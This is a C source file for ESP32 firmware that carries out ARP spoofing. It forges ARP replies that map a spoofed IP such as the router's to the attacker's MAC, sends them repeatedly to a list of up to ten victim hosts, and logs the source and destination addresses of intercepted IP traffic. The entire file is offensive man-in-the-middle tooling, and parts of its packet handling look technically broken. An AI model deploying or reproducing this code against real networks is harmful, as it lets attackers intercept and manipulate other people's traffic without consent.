#include "vendor/arp_spoof.h"
#include <string.h> 
#include <stdio.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <errno.h> 
#include <unistd.h>  
#include "esp_log.h" 
#include "freertos/FreeRTOS.h"
#include "freertos/task.h" 
#include "lwip/sockets.h" 
#include "lwip/inet.h" 
#include "lwip/err.h"    
#include "lwip/ip.h"  
#include "lwip/etharp.h" 
#include "lwip/prot/ethernet.h"
#include "lwip/prot/ip4.h"    

static const char *TAG = "ARP_SPOOF";

#define MAX_TARGETS 10
static arp_spoof_config_t targets[MAX_TARGETS];
static int num_targets = 0;
static bool spoofing_active = false;


void craft_arp_reply(arp_packet_t *packet, const arp_spoof_config_t *config) {
    packet->htype = htons(1); // Ethernet
    packet->ptype = htons(0x0800); // IPv4
    packet->hlen = 6; // MAC address length
    packet->plen = 4; // IP address length
    packet->oper = htons(2); // ARP reply

    // Fill in the packet fields
    memcpy(packet->sha, config->attacker_mac, 6);  // Attacker MAC address
    memcpy(packet->spa, config->spoof_ip, 4);      // Spoofed IP (e.g., router IP)
    memcpy(packet->tha, config->target_mac, 6);    // Target MAC address (victim MAC)
    memcpy(packet->tpa, config->target_ip, 4);     // Target IP address (victim IP)
}


void send_arp_packet(const arp_packet_t *packet) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(arp_packet_t), false);
    if (result != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send ARP packet: %s", esp_err_to_name(result));
    } else {
    }
}


void init_arp_spoof(arp_spoof_config_t *config, int num_new_targets) {
    if (num_targets + num_new_targets > MAX_TARGETS) {
        ESP_LOGE(TAG, "Cannot add more targets. Maximum limit reached.");
        return;
    }

    if (num_new_targets == 0)
    {
        spoofing_active = true;

        ESP_LOGI(TAG, "Initialized ARP spoofing with %d targets", num_new_targets);

        return;
    }

    memcpy(&targets[num_targets], config, num_new_targets * sizeof(arp_spoof_config_t));
    num_targets += num_new_targets;
    spoofing_active = true;

    ESP_LOGI(TAG, "Initialized ARP spoofing with %d targets", num_new_targets);
}


void add_target(const uint8_t *target_ip, const uint8_t *target_mac, const uint8_t *spoof_ip) {
    if (num_targets >= MAX_TARGETS) {
        ESP_LOGE(TAG, "Cannot add more targets. Maximum limit reached.");
        return;
    }

    
    arp_spoof_config_t new_target;
    memcpy(new_target.target_ip, target_ip, 4);
    memcpy(new_target.target_mac, target_mac, 6);
    memcpy(new_target.spoof_ip, spoof_ip, 4);
    esp_wifi_get_mac(ESP_IF_WIFI_STA, new_target.attacker_mac);

    targets[num_targets] = new_target;
    num_targets++;
    
    ESP_LOGI(TAG, "Added new target for ARP spoofing: IP %d.%d.%d.%d", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
}


void arp_spoof_task(void *pvParameter) {
    arp_packet_t arp_packet;

    while (spoofing_active) {
        for (int i = 0; i < num_targets; i++) {
            craft_arp_reply(&arp_packet, &targets[i]);
            send_arp_packet(&arp_packet);
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }

    vTaskDelete(NULL);
}

void packet_listener_task(void *pvParameters) {
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        ESP_LOGE(TAG, "Network interface not found");
        vTaskDelete(NULL);
        return;
    }


    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if (sock < 0) {
        ESP_LOGE(TAG, "Failed to create raw socket: %d", errno);
        vTaskDelete(NULL);
        return;
    }

    struct timeval timeout;
    timeout.tv_sec = 5;  // Timeout in seconds
    timeout.tv_usec = 0; // No microseconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    ESP_LOGI(TAG, "Packet listener task started");

    uint8_t buffer[1500];


    while (1) {
        ssize_t len = recv(sock, buffer, sizeof(buffer), 0);
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                ESP_LOGW(TAG, "Packet reception timed out, retrying...");
                continue;  // Retry on timeout
            } else {
                ESP_LOGE(TAG, "Packet reception failed: %d", errno);
                break;  // Exit on a critical error
            }
        }

        struct eth_hdr *eth = (struct eth_hdr *)buffer;

        if (ntohs(eth->type) == ETHTYPE_ARP) {
            ESP_LOGI(TAG, "ARP packet received");
        }

        else if (ntohs(eth->type) == ETHTYPE_IP) {
            ESP_LOGI(TAG, "IP packet received");

            struct ip_hdr *iph = (struct ip_hdr *)(buffer + sizeof(struct eth_hdr));

            struct in_addr src_ip, dest_ip;
            src_ip.s_addr = iph->src.addr;
            dest_ip.s_addr = iph->dest.addr;

            ESP_LOGI(TAG, "IP Source: %s", inet_ntoa(src_ip));
            ESP_LOGI(TAG, "IP Destination: %s", inet_ntoa(dest_ip));

            if (IPH_PROTO(iph) == IP_PROTO_ICMP) {
                ESP_LOGI(TAG, "ICMP packet received");
            }

            else if (IPH_PROTO(iph) == IP_PROTO_TCP) {
                ESP_LOGI(TAG, "TCP packet received");
            }
        }
    }
    close(sock);
    vTaskDelete(NULL);
}


// Function to stop ARP spoofing
void stop_arp_spoof() {
    spoofing_active = false;
    ESP_LOGI(TAG, "Stopped ARP spoofing");
}